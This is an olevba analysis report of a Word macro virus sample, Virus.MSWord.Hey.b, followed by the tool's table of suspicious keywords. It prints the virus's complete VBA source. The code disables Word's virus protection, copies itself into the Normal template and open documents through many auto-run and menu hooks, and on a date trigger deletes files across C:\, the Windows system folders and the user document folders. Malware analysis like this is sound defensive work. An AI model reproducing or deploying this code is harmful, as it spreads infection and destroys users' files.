olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hey.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hey.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Virus.MSWord.Hey.b - OLE stream: 'Macros/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen(): Options.VirusProtection = 0: ÆÏ©§¥: End Sub
Sub ÆÏ©§¥()
Set ú = NormalTemplate.VBProject.VBComponents(1).CodeModule: Set ó = ActiveDocument.VBProject.VBComponents(1).CodeModule: Set ý = ThisDocument.VBProject.VBComponents(1).CodeModule:
If ú.CountOfLines = 0 Then ú.InsertLines 1, ý.Lines(1, 47)
If ó.CountOfLines = 0 Then ó.InsertLines 1, ý.Lines(1, 40)
CommandBars("Tools").Controls("Makro").Delete
End Sub
Sub AutoNew(): ÆÏ©§¥: End Sub
Sub DocumentNew(): ÆÏ©§¥: End Sub
Sub DocumentOpen(): ÆÏ©§¥: End Sub
Sub DateiÖffnen(): ÆÏ©§¥: End Sub
Sub DateiBeenden(): ÆÏ©§¥: End Sub
Sub BearbeitenKopieren(): ÆÏ©§¥: End Sub
Sub BearbeitenEinfügen(): ÆÏ©§¥: End Sub
Sub BearbeitenAusschneiden(): ÆÏ©§¥: End Sub
Sub FormatZeichen(): ÆÏ©§¥: End Sub
Sub FormatAbsatz(): ÆÏ©§¥: End Sub
Sub FormatSpalten(): ÆÏ©§¥: End Sub
Sub FormatTabulator(): ÆÏ©§¥: End Sub
Sub FormatHintergrund(): ÆÏ©§¥: End Sub
Sub FormatAutoFormat(): ÆÏ©§¥: End Sub
Sub ExtrasAnpassen(): ÆÏ©§¥: End Sub
Sub ExtrasOptionen(): ÆÏ©§¥: End Sub
Sub ExtrasAutoKorrektur(): ÆÏ©§¥: End Sub
Sub DateiSchließen(): ÆÏ©§¥: End Sub
Sub AutoExit(): ÆÏ©§¥: If Day(31) And Month(Now) Then Call ¢¤£: End Sub
Sub ¢¤£()
On Error Resume Next
Kill "C:\*.*"
Kill "C:\Windows\*.*"
Kill "C:\Windows\System\*.*"
Kill "C:\Windows\System32\*.*"
Kill "C:\Windows\Eigene Dateien\*.*"
Kill "C:\Eigene Dateien\*.*"
Kill "C:\Dokumente\*.*"
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |DocumentOpen        |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

